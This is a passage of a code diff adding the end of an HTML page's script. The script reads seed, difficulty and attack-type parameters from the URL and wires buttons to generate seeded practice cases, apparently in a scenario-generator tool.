+    history.replaceState(null, "", url);
+  } catch (e) { /* ignore (e.g. file://) */ }
+}
+
+function readUrl() {
+  try {
+    const p = new URLSearchParams(location.search);
+    const out = {};
+    if (p.has("seed")) { const s = parseInt(p.get("seed"), 10); if (Number.isFinite(s)) out.seed = s >>> 0; }
+    if (p.has("d")) { const d = parseInt(p.get("d"), 10); if (d >= 1 && d <= 3) out.difficulty = d; }
+    if (p.has("a") && (p.get("a") === "compose" || TEMPLATES[p.get("a")])) out.attackKey = p.get("a");
+    return out;
+  } catch (e) { return {}; }
+}
+
+// ============================================================
+// INIT
+// ============================================================
+loadStats();
+renderAttackOptions();
+
+document.getElementById("newBtn").addEventListener("click", () => {
+  // honor the current attack + difficulty selects, roll a fresh seed
+  const diff = parseInt(document.getElementById("difficultySelect").value, 10);
+  const sel = document.getElementById("attackSelect").value;
+  state.difficulty = diff;
+  state.attackKey = sel === "any" ? null : sel;
+  newCase({ difficulty: diff, attackKey: state.attackKey });
+});
+
+document.getElementById("applyBtn").addEventListener("click", regenerateFromControls);
+
+document.getElementById("seedInput").addEventListener("keydown", (e) => {
+  if (e.key === "Enter") regenerateFromControls();
+});
+
+// load from URL if present, else fresh random case
+const fromUrl = readUrl();
+if (fromUrl.seed != null) {
+  state.difficulty = fromUrl.difficulty || 2;
+  state.attackKey = fromUrl.attackKey || null;
+  newCase({ seed: fromUrl.seed, difficulty: state.difficulty, attackKey: state.attackKey });
+} else {
+  state.difficulty = 2;
+  state.attackKey = null;
+  newCase({ difficulty: 2, attackKey: null });
+}
+</script>
+</body>
+</html>
